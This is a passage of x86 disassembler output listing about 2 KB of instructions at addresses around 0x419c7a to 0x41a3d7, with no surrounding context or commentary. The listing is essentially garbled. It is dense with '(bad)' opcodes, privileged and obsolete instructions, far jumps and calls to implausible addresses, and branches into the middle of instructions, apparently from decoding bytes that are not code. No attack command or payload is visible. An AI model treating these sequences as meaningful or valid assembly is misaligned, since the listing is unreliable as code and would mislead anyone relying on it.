  419c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7b:	arpl   WORD PTR [edx+0x54743b87],bx
  419c81:	and    DWORD PTR [ecx-0x43],ebx
  419c84:	aaa    
  419c85:	dec    ebx
  419c86:	push   cs
  419c87:	xor    ebp,DWORD PTR [esi]
  419c89:	cdq    
  419c8a:	icebp  
  419c8b:	mov    edx,0xdeec9e59
  419c90:	outs   dx,DWORD PTR ds:[esi]
  419c91:	imul   edx,edx,0x20c3e7db
  419c97:	js     0x419ca5
  419c99:	cmp    eax,0x535f8e22
  419c9e:	(bad)  
  419c9f:	mov    dl,0x47
  419ca1:	mov    dl,0x7b
  419ca3:	pop    eax
  419ca4:	jne    0x419d1c
  419ca6:	mov    BYTE PTR [eax+edx*8-0x19],dl
  419caa:	add    eax,0x261417b2
  419caf:	add    DWORD PTR [ebx+0x25a5a012],0xffffff94
  419cb6:	add    edi,DWORD PTR [ecx]
  419cb8:	cmp    ah,ah
  419cba:	jb     0x419c5f
  419cbc:	fidivr WORD PTR [edx]
  419cbe:	cs cmp eax,0xcebeabe6
  419cc4:	pusha  
  419cc5:	nop
  419cc6:	(bad)
  419cc9:	and    al,0x18
  419ccb:	push   DWORD PTR es:0x285a7475
  419cd2:	add    ebp,DWORD PTR [ebx+edi*1+0x5d40ef74]
  419cd9:	sbb    edi,edx
  419cdb:	jl     0x419ced
  419cdd:	and    BYTE PTR [esi+esi*4],0x54
  419ce1:	arpl   cx,sp
  419ce3:	jno    0x419d0d
  419ce5:	dec    eax
  419ce6:	xchg   esp,eax
  419ce7:	cvtps2pd xmm3,QWORD PTR [esi-0x3405f1c9]
  419cee:	sub    DWORD PTR [ecx],0x4bff730c
  419cf4:	bound  ebx,QWORD PTR [ebx+ebx*8]
  419cf7:	js     0x419cf5
  419cf9:	and    al,0xaa
  419cfb:	mov    es,WORD PTR [esi+edx*4-0x5a]
  419cff:	pop    es
  419d00:	add    eax,0x870e6789
  419d05:	sbb    al,0x29
  419d07:	mov    ch,BYTE PTR [eax-0x6b2df70d]
  419d0d:	jbe    0xd6312b21
  419d13:	fdiv   QWORD PTR [eax+0x213a6a58]
  419d19:	add    DWORD PTR [ebp-0x2cdac133],ebp
  419d1f:	inc    ebp
  419d20:	push   ebx
  419d21:	inc    edx
  419d22:	out    0x7c,eax
  419d24:	push   0xffffffe6
  419d26:	test   esi,ecx
  419d28:	mov    eax,ds:0xc8001222
  419d2d:	imul   ecx,eax,0x41
  419d30:	mov    eax,0x994a2ea1
  419d35:	call   0x4880511
  419d3a:	ins    BYTE PTR es:[edi],dx
  419d3b:	add    al,0xde
  419d3d:	xchg   ebx,eax
  419d3e:	pop    ebx
  419d3f:	es aad 0x70
  419d42:	mov    ss,WORD PTR [edx+0x34e8540d]
  419d48:	dec    esp
  419d49:	scas   eax,DWORD PTR es:[edi]
  419d4a:	xor    al,0xa3
  419d4c:	ror    BYTE PTR [ecx+esi*4-0x19766450],cl
  419d53:	inc    esi
  419d54:	test   BYTE PTR [ecx+0x6f],0xf5
  419d58:	inc    eax
  419d59:	aas    
  419d5a:	loop   0x419dd3
  419d5c:	(bad)  
  419d5d:	mov    ds:0xc02f2fb3,al
  419d62:	outs   dx,BYTE PTR ds:[esi]
  419d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d64:	repnz mov cl,0xfa
  419d67:	cmp    cl,cl
  419d69:	cs das 
  419d6b:	jae    0x419d21
  419d6d:	call   0x6854866f
  419d72:	dec    eax
  419d73:	aam    0xf4
  419d75:	sbb    eax,0x6d877b35
  419d7a:	ins    BYTE PTR es:[edi],dx
  419d7b:	imul   DWORD PTR [ecx]
  419d7d:	hlt    
  419d7e:	push   ecx
  419d7f:	mov    ebp,0xe6e6eb4a
  419d84:	dec    ecx
  419d85:	inc    esp
  419d86:	test   DWORD PTR [eax+eiz*2+0xc],eax
  419d8a:	test   al,0xf3
  419d8c:	add    ah,ch
  419d8e:	jmp    0x2f8146e0
  419d93:	adc    BYTE PTR [edx-0x2ed19e25],0x52
  419d9a:	jne    0x419db8
  419d9c:	ins    BYTE PTR es:[edi],dx
  419d9d:	outs   dx,BYTE PTR ds:[esi]
  419d9e:	sbb    BYTE PTR [ebx+0x62ec44ff],al
  419da4:	aas    
  419da5:	dec    eax
  419da6:	in     al,dx
  419da7:	and    al,0xfc
  419da9:	adc    ebx,esp
  419dab:	jle    0x419da7
  419dad:	dec    edi
  419dae:	shl    BYTE PTR [edx-0x1524934a],0x1b
  419db5:	push   edx
  419db6:	cs cli 
  419db8:	outs   dx,DWORD PTR ds:[esi]
  419db9:	jmp    0x419e2a
  419dbb:	mov    bl,0x15
  419dbd:	(bad)  
  419dbe:	cld    
  419dbf:	sar    BYTE PTR [ebp+0x1d],1
  419dc2:	call   0x893214a9
  419dc7:	dec    DWORD PTR [edx+eax*8-0x6530164a]
  419dce:	test   eax,0x2fa67bf8
  419dd3:	outs   dx,DWORD PTR ds:[esi]
  419dd4:	push   es
  419dd5:	stos   DWORD PTR es:[edi],eax
  419dd6:	cmp    DWORD PTR [ebx+0x291c4a40],0x1a5caab7
  419de0:	test   al,0x0
  419de2:	mov    dl,0x1d
  419de4:	push   0x44
  419de6:	pop    ebx
  419de7:	cdq    
  419de8:	and    al,0xe1
  419dea:	mov    ch,0x37
  419dec:	outs   dx,BYTE PTR ds:[esi]
  419ded:	pop    eax
  419dee:	cmc    
  419def:	adc    DWORD PTR [edi],eax
  419df1:	cmp    edi,DWORD PTR [ecx]
  419df3:	into   
  419df4:	push   ss
  419df5:	frstor [eax+0x6f]
  419df8:	popa   
  419df9:	ins    BYTE PTR es:[edi],dx
  419dfa:	push   cs
  419dfb:	add    BYTE PTR [edi+eiz*2+0x6f],bl
  419dff:	mov    ebx,0xb265d1cb
  419e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e05:	jnp    0x419e1b
  419e07:	stos   BYTE PTR es:[edi],al
  419e08:	pop    esi
  419e09:	test   al,0x40
  419e0b:	repnz add DWORD PTR [ecx],edx
  419e0e:	data16 loopne 0x419e1c
  419e11:	mov    ds:0x226608db,al
  419e16:	popa   
  419e17:	scas   al,BYTE PTR es:[edi]
  419e18:	sbb    eax,0xbe869ccf
  419e1d:	and    al,0x30
  419e1f:	mov    al,0x51
  419e21:	stos   BYTE PTR es:[edi],al
  419e22:	lods   eax,DWORD PTR ds:[esi]
  419e23:	dec    ebp
  419e24:	or     esp,DWORD PTR [esi-0x738bfb6d]
  419e2a:	(bad)  
  419e2b:	and    eax,0x914a1379
  419e30:	or     BYTE PTR [edx+0xe676338],0x24
  419e37:	sbb    BYTE PTR [ecx],0xc
  419e3a:	cli    
  419e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e3c:	mov    al,0x7a
  419e3e:	mov    dh,0x87
  419e40:	je     0x419e80
  419e42:	jl     0x419e8d
  419e44:	mov    bh,0xc7
  419e46:	pop    es
  419e47:	mov    edx,0x848b3266
  419e4c:	add    eax,0x1f405c5e
  419e52:	mov    bl,0x5f
  419e54:	not    DWORD PTR [ebx]
  419e56:	(bad)  
  419e57:	mov    cl,0x41
  419e59:	shr    BYTE PTR [ecx],0xaf
  419e5c:	or     eax,0x9d0a3008
  419e61:	push   cs
  419e62:	ins    DWORD PTR es:[edi],dx
  419e63:	fwait
  419e64:	xchg   ebp,eax
  419e65:	and    ecx,DWORD PTR [esi+eax*8-0x53]
  419e69:	es pop ebp
  419e6b:	push   esi
  419e6c:	std    
  419e6d:	ror    BYTE PTR [esi-0x2850de9c],0x51
  419e74:	pop    ebp
  419e75:	iret   
  419e76:	retf   0x72fc
  419e79:	adc    ah,BYTE PTR es:[esi-0x54]
  419e7d:	add    ebx,DWORD PTR [esp+edi*8+0x3bbba24b]
  419e84:	fadd   QWORD PTR [edi+0x689611a]
  419e8a:	pop    ecx
  419e8b:	push   ss
  419e8c:	lods   eax,DWORD PTR ds:[esi]
  419e8d:	mov    dl,0xf6
  419e8f:	push   edx
  419e90:	mov    bh,BYTE PTR [eax+0x79a1e67c]
  419e96:	lods   eax,DWORD PTR ds:[esi]
  419e97:	movq   mm5,QWORD PTR [eax]
  419e9a:	daa    
  419e9b:	jl     0x419ef0
  419e9d:	add    eax,0xf38c695b
  419ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea4:	pop    esp
  419ea5:	jnp    0x419eda
  419ea7:	push   0x1d
  419ea9:	adc    al,0x9b
  419eab:	or     al,0xb0
  419ead:	mov    eax,ds:0xc5a68e8
  419eb2:	shl    BYTE PTR [ebp+0x59d5998d],cl
  419eb8:	xchg   esp,eax
  419eb9:	dec    BYTE PTR [ecx-0x4e]
  419ebc:	dec    eax
  419ebd:	jmp    FWORD PTR [edi]
  419ebf:	mov    esp,0x457625f1
  419ec4:	repnz xor bl,BYTE PTR [edx+0x7f]
  419ec8:	jbe    0x419ebb
  419eca:	jo     0x419f12
  419ecc:	stc    
  419ecd:	dec    edi
  419ece:	repnz ins DWORD PTR es:[edi],dx
  419ed0:	adc    ebp,esi
  419ed2:	push   esp
  419ed3:	push   edx
  419ed4:	cmc    
  419ed5:	push   ebx
  419ed6:	xor    eax,0x58e10526
  419edb:	dec    eax
  419edc:	or     eax,0xf633470b
  419ee1:	in     al,0xbe
  419ee3:	ja     0x419f31
  419ee5:	imul   DWORD PTR [ebx]
  419ee7:	in     al,dx
  419ee8:	or     DWORD PTR [esi+ebx*8],esi
  419eeb:	dec    eax
  419eec:	and    DWORD PTR [ebx+edi*1+0x254914e3],eax
  419ef3:	sub    bl,BYTE PTR [ebp-0x41]
  419ef6:	dec    ecx
  419ef7:	fwait
  419ef8:	inc    ebx
  419ef9:	lds    esp,FWORD PTR [edx]
  419efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419efc:	(bad)  
  419efd:	dec    esp
  419efe:	cs (bad) 
  419f00:	int3   
  419f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f02:	add    eax,0xecb6d181
  419f07:	cmp    ebp,DWORD PTR [edx+0x45e1226c]
  419f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f0e:	xchg   BYTE PTR [esi+0x3f],bh
  419f11:	and    BYTE PTR [esi],dl
  419f13:	scas   al,BYTE PTR es:[edi]
  419f14:	icebp  
  419f15:	outs   dx,BYTE PTR ds:[esi]
  419f16:	dec    ebp
  419f17:	imul   esp
  419f19:	dec    esi
  419f1a:	mov    dh,0xa5
  419f1c:	std    
  419f1d:	inc    esp
  419f1e:	push   esi
  419f1f:	lods   eax,DWORD PTR ds:[esi]
  419f20:	mov    cl,0x97
  419f22:	cmp    eax,0x550eb3b4
  419f27:	push   ecx
  419f28:	das    
  419f29:	popa   
  419f2a:	cmp    eax,0xb24f9f60
  419f2f:	retf   
  419f30:	sub    eax,0xabe17d0
  419f35:	rcr    dl,1
  419f37:	and    eax,0x8dfeeaa1
  419f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f3d:	test   DWORD PTR [esi+edx*2],esp
  419f40:	mov    al,ds:0x43905830
  419f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f46:	loope  0x419ec8
  419f48:	xchg   ebp,eax
  419f49:	cmp    ecx,0x46
  419f4c:	xlat   BYTE PTR ds:[ebx]
  419f4d:	stos   DWORD PTR es:[edi],eax
  419f4e:	jb     0x419f09
  419f50:	in     al,0x19
  419f52:	outs   dx,BYTE PTR ds:[esi]
  419f53:	mov    dh,0xdb
  419f55:	dec    ecx
  419f56:	push   ebp
  419f57:	call   0x4de57c8e
  419f5c:	daa    
  419f5d:	add    bl,0x5e
  419f60:	inc    DWORD PTR [edx]
  419f62:	idiv   BYTE PTR [ecx+edx*2-0x76]
  419f66:	push   ebx
  419f67:	sub    esi,DWORD PTR [esp+ebx*2-0x1fc6a2a2]
  419f6e:	sar    DWORD PTR [edx-0x16],1
  419f71:	shr    bl,cl
  419f73:	jmp    0x3925:0x744d246a
  419f7a:	mov    DWORD PTR [edi],esi
  419f7c:	outs   dx,BYTE PTR ds:[esi]
  419f7d:	jbe    0x419f51
  419f7f:	jp     0x419f2c
  419f81:	gs push eax
  419f83:	fld    QWORD PTR [eax+0x51]
  419f86:	or     dl,0x82
  419f89:	push   esp
  419f8a:	cli    
  419f8b:	add    BYTE PTR [edi+0x3f],ch
  419f8e:	bound  esi,QWORD PTR [eax+0x5e]
  419f91:	cmc    
  419f92:	je     0x419f54
  419f94:	adc    ah,al
  419f96:	fmul   DWORD PTR [ecx-0x67]
  419f99:	sub    al,0x4d
  419f9b:	leave  
  419f9c:	(bad)  [esi-0xa7b2f94]
  419fa2:	ins    DWORD PTR es:[edi],dx
  419fa3:	sub    esp,DWORD PTR [esi]
  419fa5:	and    BYTE PTR [edi],dh
  419fa7:	or     bh,BYTE PTR [eax+0x57350017]
  419fad:	sub    al,0x21
  419faf:	adc    eax,0x95c29ff1
  419fb4:	ins    DWORD PTR es:[edi],dx
  419fb5:	jno    0x419fc9
  419fb7:	mov    al,0x1d
  419fb9:	lea    eax,[eax-0x38]
  419fbc:	dec    esi
  419fbd:	outs   dx,DWORD PTR ds:[esi]
  419fbe:	ja     0x419f90
  419fc0:	loop   0x419f54
  419fc2:	ret    0x9f9b
  419fc5:	out    dx,eax
  419fc6:	or     bh,cl
  419fc8:	ja     0x41a02d
  419fca:	cmc    
  419fcb:	or     eax,0x48b978f2
  419fd0:	cmc    
  419fd1:	mul    BYTE PTR [eax]
  419fd3:	sbb    ebp,ecx
  419fd5:	adc    DWORD PTR [edi+0x20],ecx
  419fd8:	and    BYTE PTR gs:[ebp+0x8],0x70
  419fdd:	(bad)  
  419fde:	icebp  
  419fdf:	icebp  
  419fe0:	(bad)  
  419fe1:	sar    BYTE PTR [esi],1
  419fe3:	cwde   
  419fe4:	xchg   edi,eax
  419fe5:	sbb    BYTE PTR [edi+0x52],al
  419fe8:	xchg   esp,eax
  419fe9:	ds stc 
  419feb:	imul   edi,DWORD PTR [ebx-0x34e6c939],0x7b862c7a
  419ff5:	int3   
  419ff6:	mov    ecx,0xd544c78c
  419ffb:	jle    0x419f9b
  419ffd:	cmp    al,0x71
  419fff:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a001:	mov    esp,0x7d9bc059
  41a006:	call   0x1f20eed
  41a00b:	retf   0x48d8
  41a00e:	add    DWORD PTR [edx+0x49ec25c3],0xc45e9fb9
  41a018:	adc    esp,edi
  41a01a:	test   al,0x9d
  41a01c:	out    dx,eax
  41a01d:	stos   DWORD PTR es:[edi],eax
  41a01e:	mov    dh,0xa8
  41a020:	add    al,0xa8
  41a022:	sbb    esp,DWORD PTR [eax]
  41a024:	lock test al,0xec
  41a027:	into   
  41a028:	xchg   dh,cl
  41a02a:	(bad)  
  41a02c:	imul   edx,DWORD PTR [edi],0x43d44ee9
  41a032:	loopne 0x41a070
  41a034:	xor    BYTE PTR [ebp+eiz*4-0x2ef51afe],ah
  41a03b:	or     al,BYTE PTR [edx-0x5b28909d]
  41a041:	cli    
  41a042:	sub    BYTE PTR [esi-0x242c61b0],0x2d
  41a049:	adc    eax,0x3be2d066
  41a04e:	lea    esi,[edx-0xda8c8b9]
  41a054:	or     esp,DWORD PTR [ecx-0x7be1432d]
  41a05a:	cmp    ecx,DWORD PTR [eax]
  41a05c:	jl     0x41a04a
  41a05e:	imul   esp,DWORD PTR [ebx],0xffffffde
  41a061:	push   ebx
  41a062:	cmp    eax,0xe135c042
  41a067:	sub    eax,0x60ef3b54
  41a06c:	jbe    0x41a061
  41a06e:	iret   
  41a06f:	into   
  41a070:	out    0xa5,eax
  41a072:	dec    ebp
  41a073:	(bad)  
  41a074:	int3   
  41a075:	inc    ebp
  41a076:	dec    edi
  41a077:	cwde   
  41a078:	push   esi
  41a079:	imul   esi,DWORD PTR [edi+0x6f],0x41
  41a07d:	(bad)
  41a080:	pushf  
  41a081:	xor    eax,0xc20d887d
  41a086:	popa   
  41a087:	pop    ebp
  41a088:	dec    ebx
  41a089:	scas   eax,DWORD PTR es:[edi]
  41a08a:	lahf   
  41a08b:	cs sbb dh,ch
  41a08e:	push   eax
  41a08f:	fisubr DWORD PTR [edx+0x17]
  41a092:	shl    BYTE PTR [eax],0xb7
  41a095:	push   cs
  41a096:	push   ecx
  41a097:	add    eax,ecx
  41a099:	rol    BYTE PTR [edx+0x67],cl
  41a09c:	(bad)  
  41a09d:	rcl    DWORD PTR [esi+0x489fb0ad],cl
  41a0a3:	or     ebx,eax
  41a0a5:	mov    edx,0x95bb4c13
  41a0aa:	xor    esp,esi
  41a0ac:	jbe    0x41a120
  41a0ae:	lds    edx,FWORD PTR [ecx-0x4137a477]
  41a0b4:	enter  0x5cf5,0xb6
  41a0b8:	leave  
  41a0b9:	push   esi
  41a0ba:	je     0x41a0c4
  41a0bc:	(bad)  
  41a0bd:	xchg   edi,eax
  41a0be:	or     al,BYTE PTR [ebp-0x38]
  41a0c1:	lea    eax,[ebx-0x473cadd5]
  41a0c7:	test   BYTE PTR [esi-0x70],bl
  41a0ca:	push   edx
  41a0cb:	push   edi
  41a0cc:	shl    DWORD PTR [esp+eax*1-0xa],0xb4
  41a0d1:	jge    0x41a146
  41a0d3:	rcl    ebx,cl
  41a0d5:	inc    ecx
  41a0d6:	xchg   DWORD PTR [eax],edx
  41a0d8:	jp     0x41a0d2
  41a0da:	aas    
  41a0db:	pop    esi
  41a0dc:	test   BYTE PTR [edi-0x3e2110],0xfc
  41a0e3:	fistp  WORD PTR ds:0x6754e29b
  41a0e9:	add    BYTE PTR [ebx-0x6a],ch
  41a0ec:	mov    ds:0x95130a26,al
  41a0f1:	sbb    al,0x28
  41a0f3:	popa   
  41a0f4:	mov    esi,0x25eb7db0
  41a0f9:	loop   0x41a08a
  41a0fb:	push   ebp
  41a0fc:	mov    ds:0x231c9ed,al
  41a101:	push   ebx
  41a102:	xlat   BYTE PTR ds:[ebx]
  41a103:	xor    DWORD PTR [edx-0x63],edx
  41a106:	stos   BYTE PTR es:[edi],al
  41a107:	push   esi
  41a108:	fs mov dh,0x29
  41a10b:	das    
  41a10c:	sbb    ch,BYTE PTR [edx-0x53d92d15]
  41a112:	inc    ebp
  41a113:	ja     0x41a0e2
  41a115:	in     eax,0xcd
  41a117:	daa    
  41a118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a119:	sti    
  41a11a:	cmp    al,BYTE PTR [esi+0xd]
  41a11d:	int3   
  41a11e:	enter  0xea9,0xa2
  41a122:	aad    0x3b
  41a124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a125:	popa   
  41a126:	mov    WORD PTR [ecx+esi*2+0x2f],cs
  41a12a:	and    bh,0x8f
  41a12d:	push   cs
  41a12e:	rep ins DWORD PTR es:[edi],dx
  41a130:	xor    eax,0x6190788f
  41a135:	js     0x41a0e1
  41a137:	pop    edx
  41a138:	cmp    DWORD PTR ds:0x866f74ea,edi
  41a13e:	sbb    eax,0xc158d479
  41a143:	cwde   
  41a144:	or     ebx,esi
  41a146:	push   ss
  41a147:	xchg   esp,eax
  41a148:	loope  0x41a136
  41a14a:	adc    edi,edx
  41a14c:	adc    eax,0x849169d7
  41a151:	mov    eax,0x2c339f79
  41a156:	lods   al,BYTE PTR ds:[esi]
  41a157:	std    
  41a158:	xor    ecx,esi
  41a15a:	pusha  
  41a15b:	add    ax,sp
  41a15e:	sahf   
  41a15f:	add    eax,DWORD PTR [edi]
  41a161:	lds    edi,FWORD PTR [edi+0x12e8198e]
  41a167:	in     al,0xba
  41a169:	das    
  41a16a:	pop    esp
  41a16b:	adc    bh,dl
  41a16d:	into   
  41a16e:	jnp    0x41a17e
  41a170:	jp     0x41a14b
  41a172:	pop    eax
  41a173:	dec    eax
  41a174:	xchg   DWORD PTR [edx-0x6df9648d],esi
  41a17a:	aaa    
  41a17b:	pop    ebx
  41a17c:	add    DWORD PTR [edi+eiz*1-0x635f5fcc],ecx
  41a183:	lahf   
  41a184:	xchg   edx,eax
  41a185:	push   ds
  41a186:	dec    ebp
  41a187:	and    cl,ah
  41a189:	(bad)  
  41a18a:	xchg   eax,edx
  41a18c:	mov    DWORD PTR [edi],ecx
  41a18e:	xchg   ecx,eax
  41a18f:	(bad)  
  41a190:	fcomip st,st(3)
  41a192:	pop    ss
  41a193:	mov    dh,0x9
  41a195:	inc    ebp
  41a196:	push   esi
  41a197:	jmp    0x41a1f4
  41a199:	and    DWORD PTR [ebx+0x4c],edi
  41a19c:	jb     0x41a19c
  41a19e:	bound  esi,QWORD PTR [esi+0x5e4af3d3]
  41a1a4:	aam    0x5e
  41a1a6:	fadd   DWORD PTR [edx+0x251887a8]
  41a1ac:	fldenv [edx+0x57]
  41a1af:	test   al,0x42
  41a1b1:	data16 or al,0xfb
  41a1b4:	push   ebp
  41a1b5:	clc    
  41a1b6:	(bad)  
  41a1b8:	push   esi
  41a1b9:	cmp    ebx,DWORD PTR [ebx+eiz*4+0x31]
  41a1bd:	pop    esi
  41a1be:	dec    esp
  41a1bf:	aam    0x9b
  41a1c1:	dec    ebx
  41a1c2:	dec    esi
  41a1c3:	lods   eax,DWORD PTR ds:[esi]
  41a1c4:	and    DWORD PTR [esp+eiz*8-0x55],edx
  41a1c8:	shr    ch,0x75
  41a1cb:	push   ebx
  41a1cc:	scas   eax,DWORD PTR es:[edi]
  41a1cd:	sbb    eax,0xa028881b
  41a1d2:	scas   eax,DWORD PTR es:[edi]
  41a1d3:	push   eax
  41a1d4:	test   DWORD PTR [ecx-0x79],0x9ade2fb0
  41a1db:	inc    ebp
  41a1dc:	adc    ah,BYTE PTR [ebx-0x5d]
  41a1df:	or     al,0xa4
  41a1e1:	(bad)  
  41a1e2:	aam    0xc0
  41a1e4:	loope  0x41a1f1
  41a1e6:	stc    
  41a1e7:	add    esp,ebp
  41a1e9:	sbb    al,BYTE PTR [ecx]
  41a1eb:	stc    
  41a1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ed:	jne    0x41a1d0
  41a1ef:	jae    0x41a1c3
  41a1f1:	add    DWORD PTR [ebp+eiz*8+0x22],ecx
  41a1f5:	mov    eax,0x4280f4a9
  41a1fa:	nop
  41a1fb:	in     eax,dx
  41a1fc:	ins    BYTE PTR es:[edi],dx
  41a1fd:	int3   
  41a1fe:	dec    DWORD PTR [edi]
  41a200:	(bad)  
  41a202:	push   edx
  41a203:	js     0x41a1cd
  41a205:	inc    ebp
  41a206:	inc    esp
  41a207:	call   0xbe69b653
  41a20c:	pop    edi
  41a20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a20e:	sbb    DWORD PTR [edi+0x7f],ebx
  41a211:	inc    esp
  41a212:	mov    ds:0x60fd517c,eax
  41a217:	xchg   ebp,eax
  41a218:	ret    
  41a219:	es ds into 
  41a21c:	dec    ecx
  41a21d:	clc    
  41a21e:	dec    esp
  41a21f:	stc    
  41a220:	ins    BYTE PTR es:[edi],dx
  41a221:	inc    eax
  41a222:	jmp    0xd12:0xd6721a7a
  41a229:	outs   dx,DWORD PTR ds:[esi]
  41a22a:	adc    esi,DWORD PTR [edi]
  41a22c:	cs aaa 
  41a22e:	mov    eax,ds:0x6049655f
  41a234:	inc    esi
  41a235:	out    0x49,al
  41a237:	lahf   
  41a238:	arpl   WORD PTR [edi+eax*1+0x77],sp
  41a23c:	sub    ch,BYTE PTR [ecx+0x6a0e735e]
  41a242:	out    dx,eax
  41a243:	ret    0xc61a
  41a246:	xchg   ecx,eax
  41a247:	dec    ebx
  41a248:	jle    0x41a202
  41a24a:	pop    ecx
  41a24b:	sbb    eax,0x8ccbf79e
  41a250:	push   eax
  41a251:	loop   0x41a242
  41a253:	add    edx,DWORD PTR [edi+esi*2-0x2d0eb8a]
  41a25a:	cmp    al,0x35
  41a25c:	cmp    eax,0xd653cb4e
  41a261:	call   0xc8e89b68
  41a266:	or     bl,BYTE PTR ds:0x35f5a6a0
  41a26c:	enter  0xc8c6,0xa6
  41a270:	xchg   ebp,eax
  41a271:	mov    cl,0xc2
  41a273:	in     eax,0x21
  41a275:	cwde   
  41a276:	imul   ebp,DWORD PTR [edx],0x4b7b1403
  41a27c:	mov    edx,0x54bd3e8d
  41a281:	cmc    
  41a282:	shr    ch,0xd2
  41a285:	(bad)  
  41a287:	sub    bl,BYTE PTR [edi]
  41a289:	and    al,0x46
  41a28b:	popf   
  41a28c:	cli    
  41a28d:	clc    
  41a28e:	jl     0x41a2b0
  41a290:	cmp    eax,0xd3b945bf
  41a295:	aam    0xdd
  41a297:	ins    BYTE PTR es:[edi],dx
  41a298:	aas    
  41a299:	imul   ebp,DWORD PTR [edx],0xe2131abf
  41a29f:	paddd  mm4,QWORD PTR [ebp-0x65]
  41a2a3:	outs   dx,BYTE PTR ds:[esi]
  41a2a4:	and    DWORD PTR ds:0x3128efed,0xffffffdb
  41a2ab:	repnz and eax,0xec1984a6
  41a2b1:	mov    DWORD PTR [edi-0x2827915c],esp
  41a2b7:	std    
  41a2b8:	(bad)  
  41a2b9:	cmc    
  41a2ba:	(bad)  
  41a2bb:	mov    eax,ds:0x124e512c
  41a2c0:	pop    esp
  41a2c1:	je     0x41a254
  41a2c3:	sbb    edi,ecx
  41a2c5:	out    0xf0,al
  41a2c7:	mov    edx,0xa926b83b
  41a2cc:	mov    ecx,0x3ab9ef67
  41a2d1:	loopne 0x41a278
  41a2d3:	or     BYTE PTR [ebp-0x71],ch
  41a2d6:	xchg   ebp,eax
  41a2d7:	jnp    0x41a322
  41a2d9:	and    BYTE PTR [eax],ah
  41a2db:	lods   eax,DWORD PTR ds:[esi]
  41a2dc:	xchg   esp,eax
  41a2dd:	test   DWORD PTR [edi],ecx
  41a2df:	and    ebx,DWORD PTR [edi+0x74]
  41a2e2:	jle    0x41a2d5
  41a2e4:	xchg   ecx,eax
  41a2e5:	(bad)  
  41a2e7:	lods   eax,DWORD PTR ds:[esi]
  41a2e8:	neg    BYTE PTR [edx-0x47]
  41a2eb:	fs mov ebp,0x90c6c5c4
  41a2f1:	jo     0x41a353
  41a2f3:	and    ecx,DWORD PTR [ebp-0x74d9caef]
  41a2f9:	sub    BYTE PTR [edi+0x4b],bh
  41a2fc:	mov    cl,ch
  41a2fe:	frstor [ebx+0x2e31b8f3]
  41a304:	outs   dx,BYTE PTR ds:[esi]
  41a305:	mov    WORD PTR [edi+0x2c],ds
  41a308:	sub    esp,DWORD PTR ds:0x8aaa9f13
  41a30e:	mov    eax,ds:0xcaccafff
  41a313:	jnp    0x41a373
  41a315:	(bad)  
  41a317:	xchg   DWORD PTR [esi+0x703984fa],eax
  41a31d:	inc    ebp
  41a31e:	add    al,dh
  41a320:	leave  
  41a321:	or     al,0x5c
  41a323:	pop    es
  41a324:	mov    ?,WORD PTR [esi-0x17]
  41a327:	mov    ecx,0x1f0ae68d
  41a32c:	lds    eax,FWORD PTR [eax-0x787dbf30]
  41a332:	frstpm(287 only) 
  41a334:	mov    al,ds:0x3f18ffd9
  41a339:	sub    bl,BYTE PTR [eax]
  41a33b:	xlat   BYTE PTR ds:[ebx]
  41a33c:	loope  0x41a2f9
  41a33e:	(bad)  [ebp-0x10]
  41a341:	jnp    0x41a2e8
  41a343:	popa   
  41a344:	pop    esp
  41a345:	and    eax,0xf8c806cf
  41a34a:	aam    0x5f
  41a34c:	jecxz  0x41a38f
  41a34e:	adc    al,0x14
  41a350:	xor    al,0xe0
  41a352:	popf   
  41a353:	out    0xb6,eax
  41a355:	call   0xbd93:0xf166c4b2
  41a35c:	sbb    ebp,DWORD PTR [ebx]
  41a35e:	repnz (bad) 
  41a360:	jg     0x41a304
  41a362:	imul   ebx,DWORD PTR [eax-0x12],0x73
  41a366:	dec    ebx
  41a367:	out    dx,al
  41a368:	ret    0x328a
  41a36b:	mov    al,0xce
  41a36d:	fs in  eax,dx
  41a36f:	sahf   
  41a370:	rcl    DWORD PTR [edi+ebp*4-0x74],cl
  41a374:	xchg   DWORD PTR [ebp-0x6f],edi
  41a377:	push   eax
  41a378:	adc    al,0x35
  41a37a:	fs (bad) 
  41a37c:	arpl   WORD PTR [ebx],sp
  41a37e:	inc    eax
  41a37f:	xchg   esi,eax
  41a380:	(bad)
  41a383:	cli    
  41a384:	bound  esi,QWORD PTR [edi+0x66]
  41a387:	xchg   ebx,eax
  41a388:	cs mov esp,0x2e862bc8
  41a38e:	fstp   DWORD PTR [edi]
  41a390:	adc    eax,0x14836e48
  41a395:	or     BYTE PTR [edi],bh
  41a397:	div    DWORD PTR [ecx]
  41a399:	popa   
  41a39a:	xor    ch,BYTE PTR [eax]
  41a39c:	test   DWORD PTR [edx],ebx
  41a39e:	outs   dx,BYTE PTR ds:[esi]
  41a39f:	jg     0x41a330
  41a3a1:	pop    es
  41a3a2:	popa   
  41a3a3:	push   cs
  41a3a4:	jl     0x41a372
  41a3a6:	mov    dh,0x5f
  41a3a8:	add    eax,0x192186f8
  41a3ad:	rcl    BYTE PTR [edx],1
  41a3af:	inc    ebx
  41a3b0:	dec    esp
  41a3b1:	pop    eax
  41a3b2:	(bad)  
  41a3b5:	in     eax,dx
  41a3b6:	arpl   WORD PTR [ecx+0x3402fa8e],si
  41a3bc:	faddp  st(6),st
  41a3be:	adc    bl,BYTE PTR [edi-0x47419be2]
  41a3c4:	mov    ss,WORD PTR [edi-0x6a88837]
  41a3ca:	jns    0x41a41f
  41a3cc:	adc    eax,0xe7540292
  41a3d1:	or     al,dl
  41a3d3:	ja     0x41a3fa
  41a3d5:	jecxz  0x41a41b
  41a3d7:	cmp    ecx,DWORD PTR [esi]
